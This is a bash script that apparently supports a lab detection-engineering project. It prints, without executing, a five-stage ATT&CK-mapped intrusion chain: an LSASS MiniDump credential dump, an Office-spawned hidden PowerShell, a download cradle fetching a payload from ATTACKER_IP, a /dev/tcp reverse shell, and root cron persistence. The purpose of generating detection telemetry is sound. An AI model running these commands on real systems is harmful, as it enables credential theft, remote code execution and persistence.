#!/usr/bin/env bash
# =============================================================================
# Scenario C: Multi-Platform Enterprise Intrusion Chain Emulation Script
# Windows Endpoint & Linux Target Detections
# Reference: PROJECT_PLAN.md - Section 1.3, Section 2 & Week 3
# =============================================================================

set -euo pipefail

TARGET_WIN10="${TARGET_WIN10:-192.168.56.20}"
TARGET_LINUX="${TARGET_LINUX:-192.168.56.40}"
ATTACKER_IP="${ATTACKER_IP:-192.168.56.10}"

echo "========================================================================"
echo " Starting Scenario C: Multi-Platform Enterprise Intrusion Emulation"
echo " Targets: Windows 10 (${TARGET_WIN10}), Linux Server (${TARGET_LINUX})"
echo " Attacker IP: ${ATTACKER_IP}"
echo "========================================================================"

log_step() {
    echo -e "\n[$(date +'%Y-%m-%d %H:%M:%S')] [STAGE $1] $2 (ATT&CK: $3)"
}

# -----------------------------------------------------------------------------
# Stage 1: T1003.001 - OS Credential Dumping: LSASS via Comsvcs MiniDump
# -----------------------------------------------------------------------------
log_step "1/5" "Dumping LSASS memory via comsvcs.dll MiniDump export" "T1003.001"
echo "[-] Executing on Windows 10: rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 684 C:\\Windows\\Temp\\lsass.dmp full"

# -----------------------------------------------------------------------------
# Stage 2: T1566.001 / T1204.002 - Malicious Macro / Office Child Process Spawn
# -----------------------------------------------------------------------------
log_step "2/5" "Spawning child shell from Microsoft Office application" "T1566.001 / T1204.002"
echo "[-] Executing on Windows 10: winword.exe spawning powershell.exe -w hidden"

# -----------------------------------------------------------------------------
# Stage 3: T1059.001 - PowerShell CLI Download Cradle Execution
# -----------------------------------------------------------------------------
log_step "3/5" "Executing PowerShell Net.WebClient download cradle" "T1059.001"
echo "[-] Executing on Windows 10: powershell.exe -NoP -c \"IEX (New-Object Net.WebClient).DownloadString('http://${ATTACKER_IP}/payload.ps1')\""

# -----------------------------------------------------------------------------
# Stage 4: T1059.004 - Command and Scripting: Unix Shell Reverse Shell
# -----------------------------------------------------------------------------
log_step "4/5" "Initiating interactive TCP reverse shell on Linux" "T1059.004"
echo "[-] Executing on Linux Server: /bin/bash -i >& /dev/tcp/${ATTACKER_IP}/4444 0>&1"

# -----------------------------------------------------------------------------
# Stage 5: T1053.003 - Scheduled Task/Job: Scheduled Cron Job Persistence
# -----------------------------------------------------------------------------
log_step "5/5" "Establishing persistence via /etc/cron.d/ scheduled job" "T1053.003"
echo "[-] Executing on Linux Server: echo '* * * * * root /tmp/.payload' >> /etc/cron.d/persistence_job"

echo -e "\n========================================================================"
echo " Scenario C Emulation Completed Successfully!"
echo " Telemetry generated across Windows Sysmon and Linux auditd channels."
echo "========================================================================"
